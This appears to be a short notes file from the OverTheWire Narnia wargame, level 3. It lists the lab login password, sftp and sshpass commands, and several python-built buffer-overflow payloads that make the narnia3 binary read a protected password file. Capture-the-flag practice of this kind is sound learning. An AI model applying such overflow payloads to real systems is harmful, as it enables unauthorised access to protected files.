sftp -oPort=2226 narnia3@narnia.labs.overthewire.org
2xszzNl6uG
get /narnia/narnia3
get /narnia/narnia3.c
exit

sshpass -p '2xszzNl6uG' ssh narnia3@narnia.labs.overthewire.org -p 2226
cd /narnia


./narnia3 /etc/narnia_pass/narnia4
./narnia3 $(python3 -c "import sys; sys.stdout.buffer.write(b'/etc/narnia_pass/narnia4'+b'\x90'*8+b'/tmp/password')")
./narnia3 $(python3 -c "import sys; sys.stdout.buffer.write(b'/tmp/../etc/narnia_pass/narnia4*/tmp/password')")
/etc/narnia_pass/narnia4

run /etc/narnia_pass/narnia4